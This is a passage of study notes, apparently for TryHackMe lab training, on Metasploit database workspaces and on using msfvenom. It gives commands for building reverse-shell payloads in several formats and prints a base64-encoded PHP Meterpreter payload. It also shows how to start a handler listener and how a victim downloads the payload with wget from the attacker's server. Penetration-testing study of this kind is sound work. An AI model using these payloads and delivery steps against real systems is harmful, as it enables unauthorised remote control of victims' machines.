</p></details></li></ul><h1 id="02b30b08-c9de-44fe-a3cb-e43cf99a33a3" class=""><mark class="highlight-yellow_background"><em>Database &amp; Workspace</em></mark></h1><blockquote id="8dd4a651-bf53-457f-8d76-19f4407fb0b6" class="">The database feature will allow you to create workspaces to isolate different projects.</blockquote><p id="79cb59fb-e5f2-4cb6-b47e-f36d22dd00c4" class="">Start the PostgreSQL database which Metasploit will use:</p><p id="7c35c4eb-4c15-4207-8c14-d61d5b86b9ed" class=""><code>systemctl start postgresql</code></p><p id="cbb15acd-d188-4952-a400-0b8852e832cd" class="">Then you will need to initialize the Metasploit Database:</p><p id="7db591b8-81e8-4063-827b-1fc3ccab0fe4" class=""><mark class="highlight-red"><code>msfdb init</code></mark></p><pre id="4332cc8e-5071-4e16-b0aa-8d69897aba2a" class="code code-wrap"><code>root@kali:~# systemctl start postgresql
root@kali:~# msfdb init
[i] Database already started
[+] Creating database user &#x27;msf&#x27;
[+] Creating databases &#x27;msf&#x27;
[+] Creating databases &#x27;msf_test&#x27;
[+] Creating configuration file &#x27;/usr/share/metasploit-framework/config/database.yml&#x27;
[+] Creating initial database schema
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.3/lib/active_record/connection_adapters/abstract_adapter.rb:84: warning: deprecated Object#=~ is called on Integer; it always returns nil
root@kali:~#</code></pre><p id="c7b5bdbf-0d0e-435d-87e4-d933c733e78a" class="">launch <strong><code>msfconsole</code></strong><strong> </strong>and check the database status using the <code>db_status</code> command.</p><p id="4871d899-9bd2-4c03-847c-872c88246882" class="">result: <code>[*] Connected to msf. Connection type: postgresql.</code></p><p id="7bf4109c-1f83-402e-b62a-0a96a9644a4c" class="">* If you running msfconsole already, then you need to rerun it again :)</p><p id="bd2acd08-830f-4c26-889c-3c775c131031" class="">list available workspaces: <code>workspace</code></p><table id="afbc7b41-8698-44e0-b1f4-6daf6be0f3cb" class="simple-table"><thead class="simple-table-header"><tr id="2d5f4b9c-fa09-4d79-8f61-004ecdb48a88"><th id="ajuz" class="simple-table-header-color simple-table-header" style="width:164.9976043701172px">Workspace’s command</th><th id="U=`Y" class="simple-table-header-color simple-table-header" style="width:615px">Description</th></tr></thead><tbody><tr id="dea184f9-5dbe-4e83-8f6a-c0401888a3b0"><td id="ajuz" class="" style="width:164.9976043701172px">workspace</td><td id="U=`Y" class="" style="width:615px">list available workspaces</td></tr><tr id="3f20f909-cce4-46b6-ad50-2701779893db"><td id="ajuz" class="" style="width:164.9976043701172px">workspace -h </td><td id="U=`Y" class="" style="width:615px">show the help list , or you can use <code>help workspace</code></td></tr><tr id="62dc7dab-ed50-45a6-b706-2ec00bff379b"><td id="ajuz" class="" style="width:164.9976043701172px">workspace -a</td><td id="U=`Y" class="" style="width:615px">add a workspace</td></tr><tr id="7a290244-651a-45b6-b595-26b50254b083"><td id="ajuz" class="" style="width:164.9976043701172px">workspace -d</td><td id="U=`Y" class="" style="width:615px">delete a workspace</td></tr><tr id="a5052d5a-ea78-4f73-9a10-e00c032a1677"><td id="ajuz" class="" style="width:164.9976043701172px">help</td><td id="U=`Y" class="" style="width:615px">different from regular, <code>help</code> will show the Database Backends Commands menu.</td></tr><tr id="959c4335-cc0b-4bf0-abb2-1b2f6cd49108"><td id="ajuz" class="" style="width:164.9976043701172px"><strong>db_nmap</strong></td><td id="U=`Y" class="" style="width:615px">all results will be saved to the database (hosts &amp; services) * Various scans will get more infos.</td></tr><tr id="6b5a6e6d-8876-4157-8d4d-7666d844e8e8"><td id="ajuz" class="" style="width:164.9976043701172px">hosts</td><td id="U=`Y" class="" style="width:615px">list the targets’ hosts , <code>services-h</code> for more | can combing by <code>db_nmap</code></td></tr><tr id="9cec71cd-1a3c-46ef-a600-869b2f4f8fe0"><td id="ajuz" class="" style="width:164.9976043701172px">services</td><td id="U=`Y" class="" style="width:615px">list the targets’ services , <code>services-h</code> for more | can combing by <code>db_nmap</code></td></tr><tr id="9f949553-dd00-43e7-b870-df25c01f4cc3"><td id="ajuz" class="" style="width:164.9976043701172px">hosts | services -v</td><td id="U=`Y" class="" style="width:615px"><code>-v</code> will give pretty and useful listing (verbose)</td></tr><tr id="e57cd8a7-7780-4341-8778-1564dc639078"><td id="ajuz" class="" style="width:164.9976043701172px">hosts -R</td><td id="U=`Y" class="" style="width:615px">will fill the <em>RHOST </em>option (when you are in the module)</td></tr></tbody></table><p id="8b755777-6159-4e95-b1a5-915996427f85" class="">* All command above for using in msfconsole.</p><h1 id="d390b820-6aa2-4eb3-893b-500f68156b63" class=""><em><mark class="highlight-yellow_background">Msfvenom</mark></em></h1><p id="46b43d7a-6840-4a69-83ca-4bf4b4d3bac9" class="">Exploit steps are:</p><ol type="1" id="095f80e7-4de6-4599-ad36-36bf5f20b1e3" class="numbered-list" start="1"><li>Generate the shell using MSFvenom.</li></ol><ol type="1" id="86d11402-7166-4b11-8c3a-15f73d538eb7" class="numbered-list" start="2"><li>Start the Metasploit handler.</li></ol><ol type="1" id="26cdb06a-2527-4b42-9343-6fbae3c974ed" class="numbered-list" start="3"><li>Execute the venomed file.</li></ol><h3 id="cd83d85e-beab-4875-8c71-cda4fba4b858" class=""><mark class="highlight-blue">1.</mark> <mark class="highlight-blue">Generating a reverse shell</mark></h3><p id="6f9f5e1e-a181-46aa-9397-1e7115edaca8" class="">Linux <span style="border-bottom:0.05em solid">Executable and Linkable Format</span> (elf)</p><p id="9d399837-3a44-489e-80c5-9901eec1fd62" class=""><strong><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf &gt; rev_shell.elf</code></strong></p><p id="a6d0eb8d-ef00-4238-a7de-5484123ef853" class="">The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.</p><p id="9c9588a5-f7ff-400b-a451-dd2e4b4e4153" class="">Windows</p><p id="6f5cc4ec-b8b6-4d21-8fa7-3dbc25018fc2" class=""><strong><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=XXXX -f exe &gt; rev_shell.exe</code></strong></p><p id="221c4bd7-9f53-46b1-ac01-80a9a4aab8ae" class="">PHP</p><p id="f9431480-1d50-48fc-aa21-93ff176063ed" class=""><strong><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw &gt; rev_shell.php</code></strong></p><p id="c5ab941f-617f-4998-9f0f-e3c52c213e0c" class="">The reverse_shell.php file should be edited to convert it into a working PHP file, Comments <strong><mark class="highlight-red">removed </mark></strong>from the <strong>beginning </strong>of the file. and <strong>End </strong>tag <mark class="highlight-teal"><strong>added </strong></mark></p><p id="ade83e69-0828-4d8b-9e53-cc4ba3018f49" class="">Beginning: <strong><mark class="highlight-red"><code>/*</code></mark></strong><mark class="highlight-gray"><strong><code>&lt;?php</code></strong></mark><strong><code> </code></strong><strong><mark class="highlight-red"><code>/**/</code></mark></strong><strong><mark class="highlight-red"> </mark></strong><strong>End: </strong><mark class="highlight-teal"><code><strong>?&gt;</strong></code></mark></p><p id="4edf54b5-ddd8-48a3-9fbc-fa6478bf8736" class="">ASP</p><p id="18a801e4-3718-4202-a209-7f6097a300ec" class=""><strong><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.X.X.X LPORT=XXXX -f asp &gt; rev_shell.asp</code></strong></p><p id="edd0d610-9b54-4dd7-a03b-c6c82de82318" class="">Python</p><p id="7a46f477-c858-482f-ba9f-158e0c4ed85e" class=""><strong><code>msfvenom -p cmd/unix/reverse_python LHOST=10.10.39.93 LPORT=7777 -f raw &gt; rev_shell.py</code></strong></p><p id="b4abb279-c4f7-4b70-9073-bb2cb3640c90" class="">* raw: is the normal code of the payload we are making, [.py, .php]</p><ul id="c60438e9-1a62-4ee1-9e0c-0b5417022928" class="toggle"><li><details open=""><summary>Encoders</summary><p id="2e013909-a330-47c9-9a96-af9013b05ab8" class=""><code>-e</code> parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was <code>raw</code></p><pre id="fd8882dc-361a-4e06-a39d-f60583491794" class="code"><code>~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of php/base64
php/base64 succeeded with size 1507 (iteration=0)
php/base64 chosen with final size 1507
Payload size: 1507 bytes
eval(base64_decode(Lyo8P3BocCAvKiovIGVycm9yX3JlcG9ydGluZygwKTsgJGlwID0gJzEwLjEwLjE4Ni40NCc7ICRwb3J0ID0gNDQ0NDsgaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgeyAkcyA9ICRmKCJ0Y3A6Ly97JGlwfTp7JHBvcnR9Iik7ICRzX3R5cGUgPSAnc3RyZWFtJzsgfSBpZiAoISRzICYmICgkZiA9ICdmc29ja29wZW4nKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZigkaXAsICRwb3J0KTsgJHNfdHlwZSA9ICdzdHJlYW0nOyB9IGlmICghJHMgJiYgKCRmID0gJ3NvY2tldF9jcmVhdGUnKSAmJiBpc19jYWxsYWJsZSgkZikpIHsgJHMgPSAkZihBRl9JTkVULCBTT0NLX1NUUkVBTSwgU09MX1RDUCk7ICRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOyBpZiAoISRyZXMpIHsgZGllKCk7IH0gJHNfdHlwZSA9ICdzb2NrZXQnOyB9IGlmICghJHNfdHlwZSkgeyBkaWUoJ25vIHNvY2tldCBmdW5jcycpOyB9IGlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfSBzd2l0Y2ggKCRzX3R5cGUpIHsgY2FzZSAnc3RyZWFtJzogJGxlbiA9IGZyZWFkKCRzLCA0KTsgYnJlYWs7IGNhc2UgJ3NvY2tldCc6ICRsZW4gPSBzb2NrZXRfcmVhZCgkcywgNCk7IGJyZWFrOyB9IGlmICghJGxlbikgeyBkaWUoKTsgfSAkYSA9IHVucGFjaygi.TmxlbiIsICRsZW4pOyAkbGVuID0gJGFbJ2xlbiddOyAkYiA9ICcnOyB3aGlsZSAoc3RybGVuKCRiKSA8ICRsZW4pIHsgc3dpdGNoICgkc190eXBlKSB7IGNhc2UgJ3N0cmVhbSc6ICRiIC49IGZyZWFkKCRzLCAkbGVuLXN0cmxlbigkYikpOyBicmVhazsgY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOyB9IH0gJEdMT0JBTFNbJ21zZ3NvY2snXSA9ICRzOyAkR0xPQkFMU1snbXNnc29ja190eXBlJ10gPSAkc190eXBlOyBpZiAoZXh0ZW5zaW9uX2xvYWRlZCgnc3Vob3NpbicpICYmIGluaV9nZXQoJ3N1aG9zaW4uZXhlY3V0b3IuZGlzYWJsZV9ldmFsJykpIHsgJHN1aG9zaW5fYnlwYXNzPWNyZWF0ZV9mdW5jdGlvbignJywgJGIpOyAkc3Vob3Npbl9ieXBhc3MoKTsgfSBlbHNlIHsgZXZhbCgkYik7IH0gZGllKCk7));</code></pre></details></li></ul><h3 id="70a6c69f-0a6b-4d75-ae87-1500a5c74593" class=""><mark class="highlight-blue">2. Setting up the listener</mark></h3><pre id="63ec3e36-17f4-443c-84f0-6a60f28ad57e" class="code"><code>msf6 &gt; use exploit/multi/handler
msf5 exploit(multi/handler) &gt; set lhost 10.10.39.93
msf6 exploit(multi/handler) &gt; set lport 7777
msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</code></pre><h3 id="dd233de9-a5f2-4f91-8d55-66b25a6fb288" class=""><mark class="highlight-blue">3. Run the payload on victim</mark></h3><p id="945097b3-6ec4-4298-93a6-15698e2cc52c" class="">We need the victim run the reverse shell we generated (payload) [1]</p><p id="737b5f87-e2e8-465a-a0be-031e95139033" class="">For testing example we can host a python server on the attacking machine:</p><p id="935e84e3-230b-46e6-a728-99b9f5bb2f7f" class=""><code>python3 -m http.server 9000 --bind 10.10.143.134</code></p><p id="e8a85218-7c17-4f17-94cf-0689d73766eb" class="">And the victim should download the payload:</p><p id="fe5c3d7b-62b7-4af6-9bb9-f6904f313128" class=""><code>wget http://ATTACKING_10.10.143.134:9000/shell.elf</code></p><p id="39e6c706-1ab7-4388-b702-a2f19fe00fa8" class="">
</p><p id="8424c39d-c3d1-4617-b982-59d75d216796" class="">
</p><p id="9e511d11-d43d-48bf-bcbc-4363c8cf7d09" class="">
</p><div><p id="a598e6c4-2e48-44fe-b094-bafc82298545" class="">
</p><h3 id="09b6c3d8-4ee1-4ee2-bc9a-9331731e6277" class=""><a href="https://tryhackme.com/p/Ponexen"><mark class="highlight-purple">By</mark></a><a href="https://tryhackme.com/p/Ponexen">|</a><mark class="highlight-purple"> </mark> 🇵🇸 <a href="https://www.notion.so/Try-Hack-Me-7b33b0000bea4464bae0ccb3020f8057"><strong><mark class="highlight-red"><em>Mohanad Ehab Badra</em></mark></strong></a><strong><mark class="highlight-red"><em> </em></mark></strong>☪️💚</h3><p id="2a3ed132-9890-4991-9e9a-53a0c34169bb" class="">
</p><figure id="6e610d73-f587-45fd-8ff4-37f3ab455b7c"><div class="source"><a href="https://embeds.simple.ink/custom/tryhackme-badge-1675721836">https://embeds.simple.ink/custom/tryhackme-badge-1675721836</a></div></figure></div><p id="99a04c93-350e-453a-bed3-fb29251d5805" class="">
</p></div></article></body></html>